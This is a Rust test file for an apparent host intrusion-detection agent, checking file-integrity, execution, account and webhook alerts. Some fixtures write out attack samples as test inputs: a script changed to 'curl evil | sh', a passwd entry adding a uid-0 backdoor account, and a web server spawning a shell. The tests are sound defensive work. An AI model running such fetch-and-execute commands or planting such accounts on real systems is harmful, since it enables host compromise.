use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::time::{Duration, Instant};

use soteria_integrity::baseline::{self, Approver};
use soteria_integrity::keys;

use super::*;

struct Fixture {
    _dir: tempfile::TempDir,
    root: PathBuf,
    config: Config,
    db: PathBuf,
}

/// A monitored tree with a script and a config file, an inventory, and an
/// approved, signed baseline.
fn fixture() -> Fixture {
    let dir = tempdir();
    let root = dir.path().join("root");
    fs::create_dir_all(root.join("bin")).unwrap();
    fs::create_dir_all(root.join("etc")).unwrap();
    fs::write(root.join("bin/tool"), "#!/bin/sh\necho ok\n").unwrap();
    fs::set_permissions(root.join("bin/tool"), fs::Permissions::from_mode(0o755)).unwrap();
    fs::write(root.join("etc/app.conf"), "a = 1\n").unwrap();

    let sk = dir.path().join("baseline.key");
    let pk = dir.path().join("baseline.pub");
    keys::generate(&sk, &pk).unwrap();

    let db = dir.path().join("soteria.db");
    let mut config = Config::default();
    config.general.database = db.clone();
    config.paths.include = vec![root.clone()];
    config.paths.persistence = vec![];
    config.paths.own_files = false;
    config.paths.exclude = vec![];
    config.baseline.signing_key = sk.clone();
    config.baseline.public_key = pk;
    config.alerts.journal = false;
    config.general.rules_directory = dir.path().join("rules.d");
    // The fixture lives under /tmp; tests that need unusual locations set them.
    config.execution.unusual_paths = vec![];

    let (mut store, _) = Store::create_or_migrate(&db).unwrap();
    let scope = Scope {
        include: config.paths.include.clone(),
        exclude: vec![],
        optional: Vec::new(),
    };
    scan::run(&mut store, &scope, &ScanTarget::Full, "full").unwrap();
    let draft = baseline::create_draft(&mut store, "test", None).unwrap();
    let signer = keys::load_signer(&sk).unwrap();
    let approver = Approver {
        name: "test".into(),
        uid: 0,
    };
    baseline::approve(&mut store, draft.version, &signer, &approver).unwrap();

    Fixture {
        _dir: dir,
        root,
        config,
        db,
    }
}

fn quiet() -> Options {
    Options {
        startup_scan: false,
        settle: Duration::from_millis(50),
        max_delay: Duration::from_millis(500),
        exec_sensor: false,
        ..Options::default()
    }
}

fn start(f: &Fixture, options: Options) -> Agent {
    let (store, _) = Store::create_or_migrate(&f.db).unwrap();
    Agent::start(f.config.clone(), store, options).unwrap()
}

fn alerts(agent: &Agent) -> Vec<(String, String, String)> {
    let conn = agent.store().connection();
    let mut stmt = conn
        .prepare("SELECT rule_id, object, severity FROM alerts ORDER BY id")
        .unwrap();
    stmt.query_map([], |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)))
        .unwrap()
        .map(|r| r.unwrap())
        .collect()
}

fn open_gaps(agent: &Agent, kind: &str) -> i64 {
    agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM coverage_gaps WHERE closed_at IS NULL AND kind = ?1",
            [kind],
            |r| r.get(0),
        )
        .unwrap()
}

#[test]
fn modified_file_raises_content_alert_once() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    assert!(agent.snapshot().baseline_version.is_some());

    let tool = f.root.join("bin/tool");
    fs::write(&tool, "#!/bin/sh\ncurl evil | sh\n").unwrap();
    agent.verify_path(&tool, Source::FsEvent).unwrap();
    // A second observation of the same deviation is not a new alert.
    agent.verify_path(&tool, Source::FsEvent).unwrap();

    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-003");
    assert_eq!(a[0].1, tool.display().to_string());

    let events: i64 = agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM events WHERE type = 'file.modified'",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(events, 1);
    agent.shutdown();
}

#[test]
fn deleted_and_new_files_raise_alerts() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let conf = f.root.join("etc/app.conf");
    fs::remove_file(&conf).unwrap();
    agent.verify_path(&conf, Source::FsEvent).unwrap();
    let dropped = f.root.join("bin/dropper");
    fs::write(&dropped, "x").unwrap();
    agent.verify_path(&dropped, Source::FsEvent).unwrap();

    let rules: Vec<String> = alerts(&agent).into_iter().map(|a| a.0).collect();
    assert_eq!(rules, ["FIM-002", "FIM-001"]);
    agent.shutdown();
}

#[test]
fn unchanged_file_and_out_of_scope_paths_are_quiet() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    agent
        .verify_path(&f.root.join("bin/tool"), Source::FsEvent)
        .unwrap();
    agent
        .verify_path(Path::new("/definitely/not/monitored"), Source::FsEvent)
        .unwrap();
    assert!(alerts(&agent).is_empty());
    agent.shutdown();
}

#[test]
fn startup_reconciliation_finds_offline_changes() {
    let f = fixture();
    // Changed while the agent was not running.
    fs::set_permissions(f.root.join("bin/tool"), fs::Permissions::from_mode(0o4755)).unwrap();
    let mut agent = start(
        &f,
        Options {
            startup_scan: true,
            ..quiet()
        },
    );
    agent.step(Duration::from_millis(10)).unwrap();
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-004");
    assert_eq!(a[0].2, "critical");
    assert!(agent.snapshot().last_reconciliation.is_some());
    agent.shutdown();
}

#[test]
fn live_event_is_detected_through_the_sensor() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    assert_eq!(agent.snapshot().fs_sensor_state, "running");
    fs::write(f.root.join("etc/app.conf"), "a = 2\n").unwrap();

    let deadline = Instant::now() + Duration::from_secs(5);
    while alerts(&agent).is_empty() && Instant::now() < deadline {
        agent.step(Duration::from_millis(50)).unwrap();
    }
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "FIM-003");
    agent.write_health();
    let health = agent.store().meta(HEALTH_KEY).unwrap().unwrap();
    assert!(health.contains("\"events_processed\":"), "{health}");
    agent.shutdown();
}

#[test]
fn lost_events_open_a_gap_and_force_reconciliation() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    fs::write(f.root.join("etc/app.conf"), "changed\n").unwrap();
    // Simulate the sensor losing events.
    agent.stats.dropped.fetch_add(3, Ordering::Relaxed);
    agent.check_sensor().unwrap();
    assert_eq!(open_gaps(&agent, "overflow"), 1);
    assert_eq!(agent.snapshot().fs_sensor_state, "degraded");

    agent.pending.clear();
    agent.step(Duration::from_millis(1)).unwrap();
    // The reconciliation found the change and closed the gap.
    assert!(alerts(&agent).iter().any(|a| a.0 == "FIM-003"));
    assert_eq!(open_gaps(&agent, "overflow"), 0);
    assert_eq!(agent.snapshot().fs_sensor_state, "running");
    agent.shutdown();
}

#[test]
fn tampered_baseline_raises_integrity_alert_and_is_not_used() {
    let f = fixture();
    // The daemon's public key no longer matches the seal, as if the
    // database had been re-signed by someone else.
    let other = f.root.parent().unwrap();
    keys::generate(&other.join("other.key"), &other.join("other.pub")).unwrap();
    fs::copy(other.join("other.pub"), &f.config.baseline.public_key).unwrap();
    let agent = start(&f, quiet());
    assert_eq!(agent.snapshot().baseline_version, None);
    assert_eq!(agent.snapshot().baseline_state, "failed");
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "INT-001");
    assert_eq!(open_gaps(&agent, "baseline_unverified"), 1);
    agent.shutdown();

    // Restarting does not duplicate the alert.
    let agent = start(&f, quiet());
    assert_eq!(alerts(&agent).len(), 1);
    agent.shutdown();
}

#[test]
fn critical_scan_checks_baselined_executables() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    fs::write(f.root.join("bin/tool"), "#!/bin/sh\nexit 1\n").unwrap();
    agent.critical_scan().unwrap();
    assert_eq!(alerts(&agent)[0].0, "FIM-003");
    let (status, checked): (String, i64) = agent
        .store()
        .connection()
        .query_row(
            "SELECT status, checked FROM scan_history WHERE type = 'critical'",
            [],
            |r| Ok((r.get(0)?, r.get(1)?)),
        )
        .unwrap();
    assert_eq!(status, "completed");
    assert!(checked >= 1);
    agent.shutdown();
}

#[test]
fn without_baseline_changes_are_recorded_but_not_alerted() {
    let dir = tempdir();
    let root = dir.path().join("root");
    fs::create_dir_all(&root).unwrap();
    fs::write(root.join("f"), "1").unwrap();
    let mut config = Config::default();
    config.general.database = dir.path().join("db");
    config.general.rules_directory = dir.path().join("rules.d");
    config.paths.include = vec![root.clone()];
    config.paths.persistence = vec![];
    config.paths.own_files = false;
    config.paths.exclude = vec![];
    let (store, _) = Store::create_or_migrate(&config.general.database).unwrap();
    let mut agent = Agent::start(config, store, quiet()).unwrap();
    assert_eq!(agent.snapshot().baseline_state, "none");
    assert_eq!(open_gaps(&agent, "no_baseline"), 1);
    agent.verify_path(&root.join("f"), Source::FsEvent).unwrap();
    assert!(alerts(&agent).is_empty());
    let events: i64 = agent
        .store()
        .connection()
        .query_row(
            "SELECT COUNT(*) FROM events WHERE type = 'file.created'",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(events, 1);
    agent.shutdown();
}

// ---- Execution monitoring (FR-009..FR-012) ----

use soteria_sensors::audit::ExecEvent;

fn exec_event(pid: u32, ppid: u32, exe: &Path, argv: &[&str]) -> ExecEvent {
    ExecEvent {
        time_ms: 1_795_285_908_304,
        serial: pid as u64,
        pid,
        ppid,
        uid: 1000,
        euid: 1000,
        gid: 1000,
        auid: Some(1000),
        session: Some(3),
        tty: Some("pts0".into()),
        comm: exe.file_name().map(|n| n.to_string_lossy().into_owned()),
        exe: Some(exe.to_owned()),
        path: Some(exe.to_owned()),
        cwd: Some(PathBuf::from("/")),
        argv: argv.iter().map(|a| a.as_bytes().to_vec()).collect(),
        key: Some("soteria_exec".into()),
    }
}

fn rules(agent: &Agent) -> Vec<String> {
    alerts(agent).into_iter().map(|a| a.0).collect()
}

fn root_owned(p: &Path) -> bool {
    use std::os::unix::fs::MetadataExt;
    fs::metadata(p).unwrap().uid() == 0 && fs::metadata(p.parent().unwrap()).unwrap().uid() == 0
}

#[test]
fn baselined_program_is_trusted() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let tool = f.root.join("bin/tool");
    let h = agent
        .handle_exec(&exec_event(10, 1, &tool, &["tool"]))
        .unwrap();
    if root_owned(&tool) {
        assert_eq!(h.classification, exec::Classification::Trusted);
        assert!(h.alerts.is_empty());
    } else {
        // Unprivileged test run: the file is writable by a non-root user.
        assert_eq!(h.classification, exec::Classification::Suspicious);
        assert_eq!(rules(&agent), ["EXE-001"]);
    }
    let (class, sha): (String, Option<String>) = agent
        .store()
        .connection()
        .query_row(
            "SELECT classification, sha256 FROM processes WHERE id = ?1",
            [h.process_id],
            |r| Ok((r.get(0)?, r.get(1)?)),
        )
        .unwrap();
    assert_eq!(class, h.classification.as_str());
    assert!(sha.is_some());
    agent.shutdown();
}

#[test]
fn modified_program_is_known_modified() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let tool = f.root.join("bin/tool");
    fs::write(&tool, "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let h = agent
        .handle_exec(&exec_event(10, 1, &tool, &["tool"]))
        .unwrap();
    assert_eq!(h.classification, exec::Classification::KnownModified);
    assert_eq!(h.severity, Severity::High);
    assert!(rules(&agent).contains(&"EXE-002".to_owned()));
    agent.shutdown();
}

#[test]
fn unusual_location_alerts_once() {
    let mut f = fixture();
    let drop_dir = f.root.parent().unwrap().join("scratch");
    fs::create_dir_all(&drop_dir).unwrap();
    let payload = drop_dir.join("payload");
    fs::write(&payload, "\x7fELF fake").unwrap();
    fs::set_permissions(&payload, fs::Permissions::from_mode(0o755)).unwrap();
    f.config.execution.unusual_paths = vec![drop_dir.clone()];
    let mut agent = start(&f, quiet());

    let h = agent
        .handle_exec(&exec_event(
            20,
            1,
            &payload,
            &["./payload", "--token", "s3cret"],
        ))
        .unwrap();
    assert_eq!(h.classification, exec::Classification::Suspicious);
    // Unknown and just created: high, not just medium.
    assert_eq!(h.severity, Severity::High);
    assert_eq!(rules(&agent), ["EXE-001"]);
    // Running it again does not raise a second alert.
    let h2 = agent
        .handle_exec(&exec_event(21, 1, &payload, &["./payload"]))
        .unwrap();
    assert!(h2.alerts.is_empty());
    assert_eq!(rules(&agent).len(), 1);

    // Arguments are stored redacted by default (NFR-011).
    let argv: String = agent
        .store()
        .connection()
        .query_row(
            "SELECT argv FROM processes WHERE id = ?1",
            [h.process_id],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(argv, r#"["./payload","--token","[REDACTED]"]"#);
    // The alert evidence names the process.
    let ev: String = agent
        .store()
        .connection()
        .query_row("SELECT evidence FROM alerts", [], |r| r.get(0))
        .unwrap();
    let ev: serde_json::Value = serde_json::from_str(&ev).unwrap();
    assert_eq!(ev["process"]["pid"], 20);
    assert_eq!(ev["process"]["auid"], 1000);
    assert_eq!(ev["classification"], "suspicious");
    agent.shutdown();
}

#[test]
fn deleted_program_is_flagged() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let h = agent
        .handle_exec(&exec_event(
            30,
            1,
            Path::new("/var/tmp/.x (deleted)"),
            &["x"],
        ))
        .unwrap();
    assert_eq!(h.severity, Severity::High);
    assert!(rules(&agent).contains(&"EXE-003".to_owned()));
    let h = agent
        .handle_exec(&exec_event(
            31,
            1,
            Path::new("/memfd:loader (deleted)"),
            &["loader"],
        ))
        .unwrap();
    assert_eq!(h.classification, exec::Classification::Suspicious);
    agent.shutdown();
}

#[test]
fn service_starting_a_shell_is_flagged_with_lineage() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let parent = agent
        .handle_exec(&exec_event(
            500,
            1,
            Path::new("/usr/sbin/nginx"),
            &["nginx"],
        ))
        .unwrap();
    let shell = ["/bin/sh", "/usr/bin/sh"]
        .into_iter()
        .map(Path::new)
        .find(|p| p.exists())
        .unwrap();
    agent
        .handle_exec(&exec_event(501, 500, shell, &["sh", "-c", "id"]))
        .unwrap();
    assert!(
        rules(&agent).contains(&"EXE-004".to_owned()),
        "{:?}",
        rules(&agent)
    );
    let parent_id: Option<i64> = agent
        .store()
        .connection()
        .query_row("SELECT parent_id FROM processes WHERE pid = 501", [], |r| {
            r.get(0)
        })
        .unwrap();
    assert_eq!(parent_id, Some(parent.process_id));
    agent.shutdown();
}

#[test]
fn without_baseline_executions_are_unverified() {
    let dir = tempdir();
    let mut config = Config::default();
    config.general.database = dir.path().join("db");
    config.general.rules_directory = dir.path().join("rules.d");
    config.paths.include = vec![dir.path().to_owned()];
    config.paths.persistence = vec![];
    config.paths.own_files = false;
    config.execution.unusual_paths = vec![];
    let (store, _) = Store::create_or_migrate(&config.general.database).unwrap();
    let mut agent = Agent::start(config, store, quiet()).unwrap();
    let ls = ["/bin/ls", "/usr/bin/ls"]
        .into_iter()
        .map(Path::new)
        .find(|p| p.exists())
        .unwrap();
    let h = agent.handle_exec(&exec_event(40, 1, ls, &["ls"])).unwrap();
    assert_eq!(h.classification, exec::Classification::Unverified);
    let limitations: String = agent
        .store()
        .connection()
        .query_row("SELECT limitations FROM processes", [], |r| r.get(0))
        .unwrap();
    assert!(
        limitations.contains("no approved baseline"),
        "{limitations}"
    );
    agent.shutdown();
}

#[test]
fn rule_overrides_and_administrator_rules_apply() {
    let f = fixture();
    let rules_dir = &f.config.general.rules_directory;
    fs::create_dir_all(rules_dir).unwrap();
    fs::write(
        rules_dir.join("local.toml"),
        format!(
            r#"
[[override]]
rule = "FIM-003"
severity = "critical"

[[override]]
rule = "FIM-002"
enabled = false

[[rule]]
id = "LOCAL-001"
title = "Application configuration changed"
on = "file"
severity = "high"
paths = ["{root}/etc/**"]
changes = ["content_modified"]
recommendation = "Ask the application team."

[[rule]]
id = "LOCAL-002"
title = "Listing with a secret flag"
on = "execution"
severity = "low"
programs = ["ls"]
arguments = ["--secret-flag"]
"#,
            root = f.root.display()
        ),
    )
    .unwrap();
    let mut agent = start(&f, quiet());

    let conf = f.root.join("etc/app.conf");
    fs::write(&conf, "a = 2\n").unwrap();
    agent.verify_path(&conf, Source::FsEvent).unwrap();
    let tool = f.root.join("bin/tool");
    fs::remove_file(&tool).unwrap();
    agent.verify_path(&tool, Source::FsEvent).unwrap();
    let a = alerts(&agent);
    let conf_s = conf.display().to_string();
    assert_eq!(
        a,
        vec![
            ("FIM-003".into(), conf_s.clone(), "critical".into()),
            ("LOCAL-001".into(), conf_s, "high".into()),
        ],
        "FIM-002 is disabled"
    );

    let ls = ["/bin/ls", "/usr/bin/ls"]
        .into_iter()
        .map(Path::new)
        .find(|p| p.exists())
        .unwrap();
    agent
        .handle_exec(&exec_event(60, 1, ls, &["ls", "-l"]))
        .unwrap();
    assert!(!rules(&agent).contains(&"LOCAL-002".to_owned()));
    agent
        .handle_exec(&exec_event(61, 1, ls, &["ls", "--secret-flag"]))
        .unwrap();
    assert!(
        rules(&agent).contains(&"LOCAL-002".to_owned()),
        "{:?}",
        rules(&agent)
    );

    let (version, source): (i64, String) = agent
        .store()
        .connection()
        .query_row(
            "SELECT version, source FROM rules WHERE id = 'LOCAL-001'",
            [],
            |r| Ok((r.get(0)?, r.get(1)?)),
        )
        .unwrap();
    assert_eq!((version, source.as_str()), (1, "admin"));
    agent.shutdown();

    // Invalid rules stop the agent instead of running without them.
    fs::write(
        rules_dir.join("bad.toml"),
        "[[override]]\nrule = \"NOPE\"\nenabled = false\n",
    )
    .unwrap();
    let (store, _) = Store::create_or_migrate(&f.db).unwrap();
    let err = Agent::start(f.config.clone(), store, quiet())
        .err()
        .unwrap();
    assert!(err.to_string().contains("unknown rule 'NOPE'"), "{err}");
}

/// A one-shot HTTPS server for `localhost` with a private CA. Returns the
/// port, the CA file and the request it receives.
fn webhook_server(
    dir: &Path,
    status: &'static str,
) -> (u16, PathBuf, std::thread::JoinHandle<String>) {
    use rcgen::{BasicConstraints, CertificateParams, IsCa, KeyPair};
    use rustls::pki_types::{PrivateKeyDer, PrivatePkcs8KeyDer};
    use std::io::{Read, Write};
    let mut ca_params = CertificateParams::new(Vec::<String>::new()).unwrap();
    ca_params.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
    let ca_key = KeyPair::generate().unwrap();
    let ca = ca_params.self_signed(&ca_key).unwrap();
    let key = KeyPair::generate().unwrap();
    let leaf = CertificateParams::new(vec!["localhost".to_owned()])
        .unwrap()
        .signed_by(&key, &ca, &ca_key)
        .unwrap();
    let ca_file = dir.join("ca.pem");
    fs::write(&ca_file, ca.pem()).unwrap();
    let cfg = Arc::new(
        rustls::ServerConfig::builder_with_provider(Arc::new(
            rustls::crypto::ring::default_provider(),
        ))
        .with_safe_default_protocol_versions()
        .unwrap()
        .with_no_client_auth()
        .with_single_cert(
            vec![leaf.der().clone()],
            PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(key.serialize_der())),
        )
        .unwrap(),
    );
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let h = std::thread::spawn(move || {
        let (tcp, _) = listener.accept().unwrap();
        let mut s = rustls::StreamOwned::new(rustls::ServerConnection::new(cfg).unwrap(), tcp);
        let mut req = Vec::new();
        let mut buf = [0u8; 8192];
        loop {
            let n = s.read(&mut buf).unwrap();
            req.extend_from_slice(&buf[..n]);
            let text = String::from_utf8_lossy(&req).to_string();
            if let Some(i) = text.find("\r\n\r\n") {
                let len: usize = text
                    .lines()
                    .find_map(|l| l.strip_prefix("Content-Length: "))
                    .unwrap()
                    .parse()
                    .unwrap();
                if req.len() >= i + 4 + len {
                    break;
                }
            }
        }
        s.write_all(format!("HTTP/1.1 {status}\r\nContent-Length: 0\r\n\r\n").as_bytes())
            .unwrap();
        s.conn.send_close_notify();
        let _ = s.flush();
        String::from_utf8(req).unwrap()
    });
    (port, ca_file, h)
}

fn wait_for(agent: &mut Agent, what: &str, mut f: impl FnMut(&Agent) -> bool) {
    let deadline = Instant::now() + Duration::from_secs(10);
    while !f(agent) {
        assert!(Instant::now() < deadline, "timed out waiting for {what}");
        agent.step(Duration::from_millis(20)).unwrap();
    }
}

fn meta(agent: &Agent, key: &str) -> Option<String> {
    agent.store().meta(key).unwrap()
}

#[test]
fn new_alerts_are_posted_to_the_webhook_once() {
    let mut f = fixture();
    // An alert from before notifications were on is not sent.
    {
        let mut agent = start(&f, quiet());
        let conf = f.root.join("etc/app.conf");
        fs::write(&conf, "old change\n").unwrap();
        agent.verify_path(&conf, Source::FsEvent).unwrap();
        agent.shutdown();
    }
    let (port, ca_file, server) = webhook_server(f._dir.path(), "200 OK");
    f.config.alerts.webhook = true;
    f.config.notifications.webhook.url = format!("https://localhost:{port}/hook");
    f.config.notifications.webhook.ca_file = ca_file;
    f.config.notifications.webhook.minimum_severity = Severity::Low;
    let mut agent = start(&f, quiet());
    assert_eq!(
        meta(&agent, "notified_through_webhook").as_deref(),
        Some("1")
    );

    let tool = f.root.join("bin/tool");
    fs::write(&tool, "#!/bin/sh\nevil\n").unwrap();
    agent.verify_path(&tool, Source::FsEvent).unwrap();
    wait_for(&mut agent, "delivery", |a| {
        meta(a, "notified_through_webhook").as_deref() == Some("2")
    });
    let req = server.join().unwrap();
    assert!(req.starts_with("POST /hook HTTP/1.1"), "{req}");
    let body: serde_json::Value =
        serde_json::from_str(&req[req.find("\r\n\r\n").unwrap() + 4..]).unwrap();
    let alerts = body["alerts"].as_array().unwrap();
    assert_eq!(alerts.len(), 1, "{body}");
    assert_eq!(alerts[0]["rule_id"], "FIM-003");
    assert_eq!(alerts[0]["object"], tool.display().to_string());
    // Nothing new: no second request (the server has gone).
    agent.step(Duration::from_millis(50)).unwrap();
    agent.shutdown();
}

#[test]
fn failed_delivery_is_reported_and_kept_for_retry() {
    let mut f = fixture();
    // Nothing listens on this port.
    let port = std::net::TcpListener::bind("127.0.0.1:0")
        .unwrap()
        .local_addr()
        .unwrap()
        .port();
    f.config.alerts.webhook = true;
    f.config.notifications.webhook.url = format!("https://localhost:{port}/hook");
    f.config.notifications.webhook.minimum_severity = Severity::Info;
    let mut agent = start(&f, quiet());
    let conf = f.root.join("etc/app.conf");
    fs::write(&conf, "x\n").unwrap();
    agent.verify_path(&conf, Source::FsEvent).unwrap();
    let failed = |a: &Agent| -> i64 {
        a.store()
            .connection()
            .query_row(
                "SELECT COUNT(*) FROM events WHERE type = 'notification.failed'",
                [],
                |r| r.get(0),
            )
            .unwrap()
    };
    wait_for(&mut agent, "failure", |a| failed(a) == 1);
    assert_eq!(
        meta(&agent, "notified_through_webhook").as_deref(),
        Some("0"),
        "not marked delivered"
    );
    let state: String = agent
        .store()
        .connection()
        .query_row(
            "SELECT state FROM sensor_health WHERE sensor = 'webhook' ORDER BY id DESC LIMIT 1",
            [],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(state, "failing");
    agent.shutdown();
}

/// tempfile's default names start with a dot, which counts as a hidden path.
fn tempdir() -> tempfile::TempDir {
    tempfile::Builder::new()
        .prefix("soteria-test")
        .tempdir()
        .unwrap()
}

#[test]
fn account_changes_raise_alerts_through_file_events() {
    let f = fixture();
    let etc = f.root.join("etc");
    fs::write(etc.join("passwd"), "root:x:0:0::/root:/bin/bash\n").unwrap();
    fs::write(etc.join("group"), "root:x:0:\nwheel:x:10:\n").unwrap();
    let mut options = quiet();
    options.accounts = accounts::Sources {
        root: f.root.clone(),
    };
    let mut agent = start(&f, options);
    // The first snapshot is the reference: nothing to report.
    assert!(!alerts(&agent).iter().any(|a| a.0.starts_with("ACC-")));

    fs::write(
        etc.join("passwd"),
        "root:x:0:0::/root:/bin/bash\nsupport:x:0:0::/tmp:/bin/bash\n",
    )
    .unwrap();
    wait_for(&mut agent, "account alerts", |a| {
        alerts(a).iter().any(|x| x.0 == "ACC-004")
    });
    let a = alerts(&agent);
    let uid0 = a.iter().find(|x| x.0 == "ACC-004").unwrap();
    // Named as on the host, so it correlates with the file alert.
    assert_eq!(uid0.1, "/etc/passwd");
    assert_eq!(uid0.2, "critical");
    // Unchanged on the next check: nothing new.
    let n = a.len();
    agent.check_accounts().unwrap();
    assert_eq!(alerts(&agent).len(), n);
    agent.shutdown();
}

#[test]
fn changes_to_own_files_are_critical() {
    let mut f = fixture();
    let cfg = f.root.join("etc/app.conf");
    f.config.paths.own_files = true;
    let mut options = quiet();
    options.config_path = Some(cfg.clone());
    let mut agent = start(&f, options);
    fs::write(&cfg, "a = 2\n").unwrap();
    agent.verify_path(&cfg, Source::FsEvent).unwrap();
    let a = alerts(&agent);
    assert_eq!(a.len(), 1, "{a:?}");
    assert_eq!(a[0].0, "SELF-001");
    assert_eq!(a[0].2, "critical");
    agent.shutdown();
}

#[test]
fn an_unclean_stop_is_reported_at_start() {
    let f = fixture();
    let (store, _) = Store::create_or_migrate(&f.db).unwrap();
    store.record_health("agent", "running", None).unwrap();
    let previous = selfcheck::previous_run(&store).unwrap();
    assert!(previous.is_some());
    let mut options = quiet();
    options.interrupted = previous;
    let agent = Agent::start(f.config.clone(), store, options).unwrap();
    assert!(alerts(&agent).iter().any(|a| a.0 == "SELF-002"));
    agent.shutdown();
}

#[test]
fn untrusted_setuid_transition_is_reported() {
    let f = fixture();
    let mut agent = start(&f, quiet());
    let new = f.root.join("bin/rootme");
    fs::write(&new, "#!/bin/sh\nid\n").unwrap();
    let mut ev = exec_event(11, 1, &new, &["rootme"]);
    ev.euid = 0;
    agent.handle_exec(&ev).unwrap();
    assert!(
        rules(&agent).contains(&"EXE-006".to_owned()),
        "{:?}",
        rules(&agent)
    );

    // A trusted program (in the baseline, unchanged) is not reported.
    let tool = f.root.join("bin/tool");
    let mut ev = exec_event(12, 1, &tool, &["tool"]);
    ev.euid = 0;
    let h = agent.handle_exec(&ev).unwrap();
    if h.classification == exec::Classification::Trusted {
        let n = rules(&agent).iter().filter(|r| *r == "EXE-006").count();
        assert_eq!(n, 1);
    }
    agent.shutdown();
}
